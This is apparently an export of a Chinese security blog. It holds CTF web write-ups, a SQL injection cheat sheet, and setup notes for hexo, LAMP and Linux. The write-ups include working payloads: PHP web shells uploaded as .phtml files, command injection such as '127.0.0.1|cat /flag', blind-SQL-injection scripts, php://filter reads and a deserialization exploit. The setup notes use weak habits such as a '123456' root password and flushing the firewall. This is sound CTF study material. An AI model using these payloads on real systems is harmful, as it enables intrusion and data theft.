hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123; echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;; die(&quot;xixiï½ no flag&quot;);&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt; body&#123; background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 通过分析源代码可知不能通过img处获得flag然而我们发现cmd命令是通过黑名单验证以及要经过一次md5的校验（常见套路）md5 通过百度查询md5强碰撞的例子即可得到然而cmd参数处的命令执行绕过是通过反斜杠逃逸实现的即ca\\t /flag,原理下文剖析于是该题的payload 知识点总结1.md5强碰撞参考博客：https://www.jianshu.com/p/c9089fd5b1ba 12%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 2反斜杠逃逸绕过黑名单进行rce这个题就卡在这个点上了这个原理是因为 当在前端输入ca\\t时后端将此字符存为字符串”ca\\\\t”而”ca\\\\t”需要用“\\\\\\\\t”来匹配从而绕过正则而且在shell命令里可以随便加\\不影响执行而","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"md5强碰撞","slug":"md5强碰撞","permalink":"http://m0th.top/tags/md5%E5%BC%BA%E7%A2%B0%E6%92%9E/"},{"name":"RCE","slug":"RCE","permalink":"http://m0th.top/tags/RCE/"}]},{"title":"sql注入漏洞总结","slug":"sql注入漏洞总结","date":"2020-08-09T07:45:03.000Z","updated":"2021-01-15T14:33:12.694Z","comments":true,"path":"2020/08/09/sql注入漏洞总结/","link":"","permalink":"http://m0th.top/2020/08/09/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"根据sql各种注入的知识点所整理的一点儿笔记","text":"根据sql各种注入的知识点所整理的一点儿笔记 sql注入实战笔记sql注入基础在数据库中有 information_schema 储存着数据库信息 我们可以从中查询任意字段所在的库表列 123456789101112查库select schema_name from information_schema.schemata查表select table_name from information_schema.tables where table_schema=&#x27;&#x27;查列 select column_name from information_schema.columns where table_name=&#x27;&#x27;查字段 select 列名，列名from 库名.表名 limit a,b (a表示从a+1个数据库开始，b表示从查多少个)查询各种权限的用户： select user() select system_user() select current_user()查询当前数据库名称： select database()查询数据库版本: select version()查询数据库路径：select @@datadir查询操作系统：select @@version_compile_os 注入点测试sql注入根据参数所传类型大致可以分为两类 字符型注入和数字型注入 数字型注入sql语句大致为 select * from &lt;表名&gt; where id = x 可以用 and 1=1 和 and 1=2 来判断是否存在注入点 字符型注入sql语句大致为 select * from &lt;表名&gt; where id = &#39;x&#39; 我们可以用 1&#39; 和 1&#39;—— qwe 来判断是否存在注入点 或者 1&#39; and &#39;1&#39;=&#39;1 和 1&#39; and &#39;1&#39;=&#39;2 来判断是否存在注入点 union 回显注入测试当前表中存在几列 order by 3 测试回显位置 union select 1,2,3 在回显位置 查询 union select 1,2,database() 报错注入updatexml UPDATEXML (XML_document, XPath_string, new_value); 该函数用来对xml文档进行更新 参数1：xml 文档对象 参数2：路径（Xpath语法） 参数3：替换查找到的符合条件的数据 注入原理:通过符号字符构造不符合XPath语法的路径引发报错，从而使得sql语句执行并在报错信息中回显 例如 updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) tips : updatexml 进行显错注入时，只能回显32字节，所以我们最好配合substr函数使用所以 extractvalue该函数是用来对xml文档进行查询 extractvalue(目标xml文档，xml路径) 注入原理同 updatexml 例如 and extractvalue(1,concat(0x7e,(SELECT @@version),0x7e)); floor(rand()*2)双查询报错注入select …(select …)两个嵌套的查询，里面的select被称为是子查询，执行顺序是先进行子查询再执行外面的select rand()随机函数，返回0~1之间的某值 floor()取整函数 count()计数函数,返回查询对象的总数 group by clause分组语句，按照查询结果分组 最后根据报错显示具体信息 注入原理：通过floor方法来爆破数据的本质是group by语句的爆破。 group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行和不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值 常用payload 1id=0&#x27; union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10--+ 布尔注入注入原理：通过有无回显信息猜解字符串 所用函数 length() 反回字符串长度 例如猜解数据库长度 length(database()) =12 substr(string,start,length) 截取字符串 例如猜解字符串长度 substr(database(),0,1)=’a’ left(a,b)截取字符串 例如 left(a,b)从左侧截取 a的前b位 regexp 正则匹配函数 例如 select user regexp ‘r’ user 的结果假设是root regexp匹配root的正则 like 正则匹配函数 select user() like ‘roo%’ 也是匹配但是必须从第一个字符开始 ascii()/ord() 将字符转换成ascii值 时间盲注sleep() 等待几秒 例如 sleep(10)等待十秒 benchmark(5000000, md5(‘test’)）通过进行大量次数的运算来延时 if(expr1,expr2,expr3) 如果expr1为TRUE 则返回 expr2;为FLASE 则返回 expr3 and if(1=0,1,sleep(10)); 结合布尔盲注的函数 只是换了一种猜解方式 head头注入任何与数据库交互的地方都可能存在sql注入漏洞 有时候网站会在数据库中保存我们的ip以及User-Agent 信息 如果通过http数据报头形式储存 那么可以构造http报头的字段进行sql注入 采用updatexml 函数 构造如下形式 1666&#x27; or updatexml (1,concat (0x7e,database()),0) or &#x27; 宽字节注入前提：sql注入所需要的特殊符号’’或’ 被转义且mysql中采用的是gbk编码 注入原理：利用了gbk编码的特性 即0x00-0x7F范围内是单字节第一位，和 ASCII 保持一致。双字节的第一字节范围是0x81-0xFE 例如 输入 0xbf27 转义加上了0xbf5c27 在mysql解析中变成 0xbf5c 和0x27 从而吃掉了\\逃逸出来’ 在sqlmap使用时 –tamper=unmagicquotes.py 读写文件注入读取前提 ： 1、用户权限足够高，尽量为root用户 2、secure_file_priv 不为NULL 读文件 select load_file(&#39;D:\\\\flag.txt&#39;) 写入前提： 1、用户权限足够 2、set globle general_log=on 写文件 select 1,2,3 into outfile &#39;路径&#39; 堆叠注入在sql中，;用来当做一条sql语句的结束符号，将多个sql语句通过;分开，一起注入，同时执行，即造成了stacked injection。 二次注入第一次和数据库交互点插入恶意数据，在写入数据库时保留了输入数据的构造特点 第二次与数据库交互，因为开发者总是默认存入数据库的数据总是安全的，直接从数据库中取出了恶意数据，所以将其作为payload进行二次注入攻击 Bypassbypass 注释preg_replace(mixed $pattern,mixed $replacement,mixed $subject) 通过构造闭合后面的单引号，从而不使用注释符 or ‘1’=’1 bypass and orpreg_replace 下可以用 双写绕过 a/**/nd 符号代替 and–&amp;&amp; or–|| bypass 空格编码：hex,urlencode %09 tab键（水平） %0a 新建一行 %0d return 功能 %0b tab键（垂直） 括号绕过空格 例如?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23 bypass union select大小写 双写 内联注释绕过 bypass ‘ “十六进制编码 宽字节注入绕过 等价函数bypass1234567hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring() 盲注脚本时间延迟盲注12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsimport timevalue =&quot;0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&amp;^@_.-!\\&#123;\\&#125;&quot;result=&quot;&quot;&#x27;&#x27;&#x27;def get_length():#获取数据的长度 for n in range(1, 100): payload = &quot;admin&#x27; and if((length((&#123;0&#125; ))=&#123;1&#125;),(benchmark(5000000, md5(&#x27;test&#x27;))),1) #&quot;.format(data_payload, n) data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;submit&quot;&#125; start_time = time.time() html = requests.post(url, data=data) end_time = time.time() use_time = end_time - start_time #求出请求前后的时间差来判断是否延时了 if use_time &gt; 3: print(&quot;...... data&#x27;s length is :&quot;+ str(n)) return n&#x27;&#x27;&#x27;#不知道上面这个函数啥情况，总是报一个蜜汁错误，不过不怎么影响def get_data(length):#获取数据 global result for n in range(1,length): for v in value: payload = &quot;admin&#x27; and if((ascii(substr((&#123;0&#125; ),&#123;1&#125;,1)) = &#x27;&#123;2&#125;&#x27;),BENCHMARK(100000000, md5(&#x27;test&#x27;)),1) #&quot;.format(data_payload,n,ord(v)) data = &#123;&quot;usname&quot;:payload,&quot;pswd&quot;:&quot;admin&quot;&#125; start_time = time.time() requests.post(url,data=data) end_time = time.time() use_time = end_time - start_time if use_time &gt;6: result += v print(&quot;......&quot;+result) url = &quot;&quot; data_payload =&quot;select flag from flag&quot; length =30 #注意这里要长度加 1 因为 range（1,10）的范围是 1&lt;= x &lt;10get_data(length)print(&quot;.....data is :&quot;+ result)","categories":[{"name":"web漏洞笔记","slug":"web漏洞笔记","permalink":"http://m0th.top/categories/web%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://m0th.top/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"hexo-github博客搭建","slug":"hexo-github博客搭建","date":"2020-08-09T02:35:37.000Z","updated":"2020-12-09T10:40:15.359Z","comments":true,"path":"2020/08/09/hexo-github博客搭建/","link":"","permalink":"http://m0th.top/2020/08/09/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","excerpt":"hexo用来搭建个人博客以及博客个性化很是方便，我写了一下搭建的步骤","text":"hexo用来搭建个人博客以及博客个性化很是方便，我写了一下搭建的步骤 hexo+github 博客搭建0x01 安装git 0x02安装nodejs 0x03github创建个人仓库 注意此仓库名为你github用户名.github.io 0x04 配置秘钥鼠标 右键 打开gitbash 回车三次，默认不用设置密码 进入此目录并且打开id_rsa.pub 文件 并复制内容 打开github 配置秘钥 new ssh key title随意填 key 为在本地复制的内容 （此操作的目的在于将本地和github仓库之间通过公钥密码的方式连接起来，不必每次往github上部署代码都要输入密码） 0x05 安装hexo12npm config set registry https://registry.npm.taobao.org #换成国内源npm install -g hexo-cli 测试hexo 运行正常 0x06 本地搭建hexo博客选择一个本地空目录 /blog （必须是空的） 12cd /bloghexo init #初始化博客 此时hexo博客已经初步完成，通过以下命令来测试一下效果 123hexo clean #清空缓存hexo g #==hexo generate 生成hexo s #==hexo server 启动服务预览 成功 0x07 部署到github打开初始化博客所在目录 打开 _config 修改为： deploy: type: git repo: 这里填入你之前在GitHub上创建仓库的完整路径，记得加上 .git branch: master 参考如 安装插件 1npm install hexo-deployer-git --save 这个步骤主要是为了让hexo知道你要把blog部署到哪个位置 0x08更换主题我是真的觉得这个主题太丑了，所以打算换一个好看的 打开blog文件目录下的config配置文件 修改theme字段即可 然后重新deploy到github","categories":[{"name":"环境搭建","slug":"环境搭建","permalink":"http://m0th.top/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://m0th.top/tags/hexo/"}]},{"title":"一些特别简单的web题","slug":"一些特别简单的web题","date":"2020-06-13T16:36:54.000Z","updated":"2021-03-17T14:17:32.027Z","comments":true,"path":"2020/06/14/一些特别简单的web题/","link":"","permalink":"http://m0th.top/2020/06/14/%E4%B8%80%E4%BA%9B%E7%89%B9%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84web%E9%A2%98/","excerpt":"一些题目过于简单，基本没什么特别的考点，签到题，不适合整理为单独一篇，所以写到一起","text":"一些题目过于简单，基本没什么特别的考点，签到题，不适合整理为单独一篇，所以写到一起 [极客大挑战 2019]Havefun1http:&#x2F;&#x2F;14bae7b3-18dd-44fe-bb46-6137f22d2a09.node3.buuoj.cn&#x2F;?cat&#x3D;dog [ACTF2020 新生赛]Include1http:&#x2F;&#x2F;d7edc6bc-6e7b-4438-a436-0439ed0b1a5e.node3.buuoj.cn&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php [极客大挑战 2019]Secret File 1http:&#x2F;&#x2F;14cfb339-abd0-4e02-8ef9-06ad8abe2a10.node3.buuoj.cn&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php [极客大挑战 2019]LoveSQL admi’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’geek’# admi’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’l0ve1ysq1’# admi’ union select 1,group_concat(concat(username,0x7e,password)),3 from geek.l0ve1ysq1# [ACTF2020 新生赛]Exec 127.0.0.1|ls / 127.0.0.1|cat /flag [极客大挑战 2019]Knife [极客大挑战 2019]Http简单的http包的构造 1234567891011GET /Secret.php HTTP/1.1Host: node3.buuoj.cn:27472User-Agent: Syclover/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0referer: https://www.Sycsecret.comX-Forwarded-For: 127.0.0.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: UM_distinctid=1761c7d1b1462-0f5e806b80c1f4-4c3f2779-18b040-1761c7d1b15293Upgrade-Insecure-Requests: 1 [极客大挑战 2019]PHPwww.zip 备份 :label:index.php 12345&lt;?php include &#x27;class.php&#x27;; $select = $_GET[&#x27;select&#x27;]; $res=unserialize(@$select); ?&gt; :label:class.php 123456789101112131415161718192021222324252627282930class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125; 简单的反序列化绕过 __wakeup ，构造如下 1234567891011121314&lt;?phpclass Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username, $password) &#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125;&#125;$a=serialize(new Name(&#x27;admin&#x27;,100));echo urlencode($a); //O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D [极客大挑战 2019]Upload一道比较简单的上传题 1234567891011121314151617181920212223242526POST /upload_file.php HTTP/1.1Host: 9a06cdee-ebb8-44cf-8836-fd81b4906624.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------225563114326711804942887893620Content-Length: 439Origin: http://9a06cdee-ebb8-44cf-8836-fd81b4906624.node3.buuoj.cnConnection: closeReferer: http://9a06cdee-ebb8-44cf-8836-fd81b4906624.node3.buuoj.cn/Cookie: UM_distinctid=1761c7d1b1462-0f5e806b80c1f4-4c3f2779-18b040-1761c7d1b15293Upgrade-Insecure-Requests: 1-----------------------------225563114326711804942887893620Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.phtml&quot;Content-Type: image/pngGIF89a?&lt;script language=&#x27;php&#x27;&gt;phpinfo();eval($_REQUEST[&#x27;M0th&#x27;]);&lt;/script&gt;sssssssssssssssssssssss-----------------------------225563114326711804942887893620Content-Disposition: form-data; name=&quot;submit&quot;鎻愪氦-----------------------------225563114326711804942887893620-- [极客大挑战 2019]BabySQL简单的注入 1234admin&#39;|| updatexml(1,concat(0x7e,(database())),1)# geekdmin&#39; uniunionon seleselectct 1,2,3#dmin&#39; uniunionon seleselectct 1,database(),group_concat(table_name) frfromom infoorrmation_schema.tables wherwheree table_schema&#x3D;&#39;geek&#39;# b4bsql,geekuserdmin&#39; uniunionon seleselectct 1,database(),group_concat(column_name) frfromom infoorrmation_schema.columns wherwheree table_name&#x3D;&#39;geekuser&#39;# id,username,password [ACTF2020 新生赛]Upload简单上传题 1234567891011121314151617181920212223242526POST / HTTP/1.1Host: ceb0c5e2-1e0e-426f-b67c-00bf90827db6.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------55100373822564074781056694082Content-Length: 394Origin: http://ceb0c5e2-1e0e-426f-b67c-00bf90827db6.node3.buuoj.cnConnection: closeReferer: http://ceb0c5e2-1e0e-426f-b67c-00bf90827db6.node3.buuoj.cn/Cookie: UM_distinctid=1761c7d1b1462-0f5e806b80c1f4-4c3f2779-18b040-1761c7d1b15293Upgrade-Insecure-Requests: 1-----------------------------55100373822564074781056694082Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;x.phtml&quot;Content-Type: image/pngGIF89a&lt;?php eval(system($_GET[&#x27;M0th&#x27;]));phpinfo();?&gt;-----------------------------55100373822564074781056694082Content-Disposition: form-data; name=&quot;submit&quot;upload-----------------------------55100373822564074781056694082-- 1http:&#x2F;&#x2F;ceb0c5e2-1e0e-426f-b67c-00bf90827db6.node3.buuoj.cn&#x2F;uplo4d&#x2F;838cf4020bc77e8f974f2835f3ae4c1a.phtml?M0th&#x3D;cat%20&#x2F;flag [ACTF2020 新生赛]BackupFilebak隐藏文件 1234567891011121314151617&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#x27;key&#x27;])) &#123; $key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125;&#125;else &#123; echo &quot;Try to find out source file!&quot;;&#125; 1http:&#x2F;&#x2F;195c9eff-d41f-4009-938c-528249666a40.node3.buuoj.cn&#x2F;?key&#x3D;123 [极客大挑战 2019]BuyFlag直接给源码了, strcmp通过数组来绕过 1234567891011&lt;!-- ~~~post money and password~~~if (isset($_POST[&#x27;password&#x27;])) &#123; $password = $_POST[&#x27;password&#x27;]; if (is_numeric($password)) &#123; echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;; &#125;elseif ($password == 404) &#123; echo &quot;Password Right!&lt;/br&gt;&quot;; &#125;&#125;--&gt; 1234567891011121314151617POST /pay.php HTTP/1.1Host: 3fb81d90-0ba8-44f1-bc6f-ce1d696ba7e9.node3.buuoj.cnContent-Length: 31Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36Origin: http://3fb81d90-0ba8-44f1-bc6f-ce1d696ba7e9.node3.buuoj.cnContent-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://3fb81d90-0ba8-44f1-bc6f-ce1d696ba7e9.node3.buuoj.cn/pay.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: UM_distinctid=177f24714762d6-07ad73289ec17-53e356a-144000-177f24714776fd; user=1Connection: closepassword=404a&amp;money[]=100000000 [MRCTF2020]Ez_bypass123456789101112131415161718192021222324252627282930313233343536373839include &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else&#123; die(&#x27;only one way to get the flag&#x27;); &#125;&#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;&#125;else&#123; die(&#x27;Please input first&#x27;);&#125;&#125; 简单的弱类型绕过","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"},{"name":"签到题","slug":"签到题","permalink":"http://m0th.top/tags/%E7%AD%BE%E5%88%B0%E9%A2%98/"}]},{"title":"[BJDCTF2020]Easy MD5","slug":"BJDCTF2020-Easy-MD5","date":"2020-05-14T14:15:14.000Z","updated":"2021-02-19T12:56:46.625Z","comments":true,"path":"2020/05/14/BJDCTF2020-Easy-MD5/","link":"","permalink":"http://m0th.top/2020/05/14/BJDCTF2020-Easy-MD5/","excerpt":"这个题涉及到一个很小很特别的点，而且感觉也挺有实用场景的","text":"这个题涉及到一个很小很特别的点，而且感觉也挺有实用场景的 写在前面这题设计到一个我不知道的知识，记录一下所查大佬的博客连接：https://blog.csdn.net/March97/article/details/81222922https://www.cnblogs.com/h3zh1/p/12656446.html 尝试之路加wp卡在第一步emmmm应该输入一个万能密码尝试过爆破无果大佬们的输入是 ffifdyop然后进入第二层很常规 数组或者0e碰撞进入第三层数组绕过 知识点0x01—-md5($password,true)而 1234content: ffifdyophex: 276f722736c95d99e921722cf9ed621craw: &#x27;or&#x27;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1cstring: &#x27;or&#x27;6]!r,b 与原来的语句进行了拼接即 1&quot;select * from &#x27;admin&#x27; where password=&#x27; &quot;.md5($pass,true).&quot; &#x27; &quot; 拼接成 1&quot;select * from &#x27;admin&#x27; where password=&#x27;&#x27; or&#x27;6蒥欓!r,b&#x27; &quot; 而or 后第一字符是非0数字字符 会被认为是ture进而实现无密码登入 记录一下几组md5碰撞值备用0e开头的md5和原值：QNKCDZO 0e830400451993494058024219903391 240610708 314282422 571579406 s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a 12345678&lt;?phpfor($i=1;$i&lt;11111111111;$i++)&#123; $str1=md5($i); if(preg_match(&#x27;/^0e\\d+$/&#x27;,$str1))&#123; print($i); &#125;&#125;","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"md5弱相等","slug":"md5弱相等","permalink":"http://m0th.top/tags/md5%E5%BC%B1%E7%9B%B8%E7%AD%89/"}]},{"title":"最简单的lamp环境搭建","slug":"最简单的lamp环境搭建","date":"2020-05-11T13:22:54.000Z","updated":"2020-08-09T13:30:03.008Z","comments":true,"path":"2020/05/11/最简单的lamp环境搭建/","link":"","permalink":"http://m0th.top/2020/05/11/%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84lamp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"从入门第一步学姐要求在linux上搭建一个lamp环境，当时很迷，什么都不会，花了好久才弄完，最近接触到一种非常简便的lamp搭建方式，记录一下","text":"从入门第一步学姐要求在linux上搭建一个lamp环境，当时很迷，什么都不会，花了好久才弄完，最近接触到一种非常简便的lamp搭建方式，记录一下 什么是lampl 是 linux操作系统a 是apache web服务器m 是mysql 数据库p 是php 语言lamp就是基于以上的一种网站部署的环境 搭建过程（本次使用红帽linux，其他linux也类似）配置yum源 用vi编辑器修改 vi /etc/yum.repos.d/rhel-source.repo 修改成如下 用镜像光盘自带的包就可以一个命令搞定安装 1yum -y install httpd php mysql mysql-server php-mysql 启动服务service httpd startservice mysqld start配置数据库密码mysqladmin -u root password 123456清空防火墙策略iptables -F访问即可","categories":[{"name":"环境搭建","slug":"环境搭建","permalink":"http://m0th.top/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}],"tags":[{"name":"web","slug":"web","permalink":"http://m0th.top/tags/web/"}]},{"title":"linux系统基础","slug":"linux系统基础","date":"2020-05-06T13:19:46.000Z","updated":"2021-03-26T09:43:15.469Z","comments":true,"path":"2020/05/06/linux系统基础/","link":"","permalink":"http://m0th.top/2020/05/06/linux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/","excerpt":"当时学linux上来就是搭建环境，对linux很不熟悉，现在趁着hacker学习这个很好的资源把基础也补一下","text":"当时学linux上来就是搭建环境，对linux很不熟悉，现在趁着hacker学习这个很好的资源把基础也补一下 Linux系统要点内核版本识别 磁盘分区表示 redhatlinux密码忘了怎么办e键进入然后e键选中第二个再按e键输入空格s 回车 然后b键进入 kernel 得到一个shell 可以修改密码 Linux目录结构 目录 说明 / 虚拟目录的根目录，通常不会在这里存储文件 /bin 二进制目录，存放用户级的GNU工具 （就是所谓的命令） /boot 启动目录，存放启动文件 /dev 设备目录，系统在这里创建设备节点 /etc 系统配置文件目录 /home 主目录，系统在这里创建用户目录 /lib 库目录，存放系统和应用程序的库文件 /media 媒体目录，可移动媒体设备的常用挂载点 /mnt 挂载目录，另一个可移动媒体设备的常用挂载点 /opt 可选目录，常用于存放第三方软件包和数据文件 /proc 进程目录，存放现有硬件及当前进程的相关信息 /root Root用户的主目录 /sbin 系统二进制目录，存放许多gnu管理员级工具 /run 运行目录，存放系统运作时的运行时数据 /srv 服务目录，存放本地服务的相关文件 /sys 系统目录，存放系统硬件信息的相关文件 /tmp 临时目录，可以在该目录中创建删除临时工作文件 /usr 用户二进制目录，大量用户级的gnu工具和数据文件存储 /var 可变目录，用以存放经常变化的文件，比如日志文件 Linux系统命令 常见命令uname -r 查看内核版本号 hostname 查看主机名 ifconfig 查看ip cat /proc/cpuinfo 查看cpu信息 cat /proc/meminfo 查看内存信息 halt 关机（shutdown -h 或者poweroff） reboot 重启 pwd 查看当前路径 ls 查看当前目录有哪些文件 du 统计 目录及文件的空间占用情况 du 选项 目录名 mkdir 创建目录 -p 递归创建 touch 新建空文件 ln -s 源文件地址 目录 建立连接 cp -r递归复制整个目录树 -p保持源文件属性不变 -f强制覆盖 -i 覆盖时提醒 rm 删除 mv移动文件和目录 find 查找文件和目录 cat 